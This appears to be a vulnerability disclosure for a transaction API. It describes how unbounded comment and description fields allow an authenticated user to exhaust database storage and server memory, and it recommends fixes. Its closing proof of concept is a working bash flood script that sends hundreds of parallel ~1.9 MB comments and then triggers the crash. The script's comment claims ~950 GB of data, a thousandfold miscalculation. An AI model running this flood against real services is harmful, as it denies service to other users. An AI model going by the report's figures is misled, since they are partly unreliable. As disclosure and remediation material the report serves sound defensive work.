### Title
Unbounded String Fields in Transaction and Comment DTOs Enable Authenticated DoS via Storage and Memory Exhaustion

### Summary
The `CreateTransactionDto` (`name`, `description`) and `CreateCommentDto` (`message`) fields accept arbitrarily large strings with no `@MaxLength()` constraint. Any authenticated user can repeatedly submit requests up to the 2 MB body limit, accumulating unbounded data in PostgreSQL. When the API later loads transactions with their `comments` relation, it materializes all stored comment bodies into server memory, enabling memory exhaustion and service degradation.

### Finding Description

**Root cause — missing length constraints on user-controlled string fields:**

`CreateTransactionDto` declares `name` and `description` with only `@IsString()`: [1](#0-0) 

`CreateCommentDto` declares `message` with only `@IsString()`: [2](#0-1) 

`CreateTransactionGroupDto` declares `description` with only `@IsString()`: [3](#0-2) 

No `@MaxLength()` decorator is present on any of these fields. The only server-side size guard is the global Express body parser limit: [4](#0-3) 

This is a per-request limit of 2 MB, not a per-field or per-user cumulative limit.

**Exploit path — comment accumulation causing memory exhaustion on transaction load:**

`getTransactionById` eagerly loads the `comments` relation for every transaction fetch: [5](#0-4) 

An attacker who is an authenticated user (signer, observer, creator, or approver of any transaction) can:
1. Post thousands of comments each containing a ~2 MB `message` string to a single transaction.
2. Trigger any code path that calls `getTransactionById` for that transaction (e.g., fetching transaction details, signing, approving).
3. Force the server to load all accumulated comment bodies into heap memory simultaneously, exhausting available RAM and causing OOM crashes or severe latency.

For `name`/`description` on transactions: any authenticated user can create transactions. Submitting many transactions with ~2 MB `name` or `description` values bloats the database and slows paginated listing queries that return these fields.

### Impact Explanation
- **Memory exhaustion / OOM crash** of the API process when a transaction with many large comments is loaded, taking down the service for all users.
- **Database storage exhaustion** from unbounded accumulation of large `name`, `description`, and `message` values with no per-user or per-field quota.
- **Query performance degradation** on transaction listing endpoints that return `name`/`description` for all visible transactions.

Severity: **High** — a single authenticated user can render the API unavailable for all other users.

### Likelihood Explanation
- **Precondition:** valid authenticated session only — no admin or privileged role required.
- **Attack complexity:** trivial; a simple script looping HTTP POST requests suffices.
- **Partial mitigations present but insufficient:**
  - The 2 MB body limit caps each individual request but does not bound cumulative storage.
  - Rate-limiting throttlers exist but are scoped to email and IP/user request rates, not to per-field data volume.

### Recommendation
1. Add `@MaxLength(N)` to every user-controlled string field in DTOs. Suggested limits: `name` ≤ 256 chars, `description` ≤ 2 048 chars, comment `message` ≤ 4 096 chars.
2. Enforce matching column-level constraints in the TypeORM entity definitions (e.g., `@Column({ length: 256 })`).
3. Add a per-transaction comment count limit enforced in the comment creation service.
4. Consider lazy-loading or paginating the `comments` relation instead of eagerly loading all comments in `getTransactionById`.

### Proof of Concept

```bash
# Step 1: Authenticate and obtain a JWT token
TOKEN=$(curl -s -X POST http://localhost:3000/auth/login \
  -H 'Content-Type: application/json' \
  -d '{"email":"attacker@example.com","password":"ValidPass1"}' \
  | jq -r '.accessToken')

# Step 2: Obtain a valid transaction ID the attacker has access to
TX_ID=1

# Step 3: Flood the transaction with ~2 MB comments in a loop
LARGE_MSG=$(python3 -c "print('A' * 1900000)")

for i in $(seq 1 500); do
  curl -s -X POST http://localhost:3000/transactions/$TX_ID/comments \
    -H "Authorization: Bearer $TOKEN" \
    -H 'Content-Type: application/json' \
    -d "{\"message\": \"$LARGE_MSG\"}" &
done
wait

# Step 4: Any subsequent fetch of this transaction now loads ~950 GB of comment
# data from the DB into server heap, causing OOM / service crash
curl -s http://localhost:3000/transactions/$TX_ID \
  -H "Authorization: Bearer $TOKEN"
```

Expected outcome: the API process exhausts heap memory and crashes or becomes unresponsive, denying service to all users.
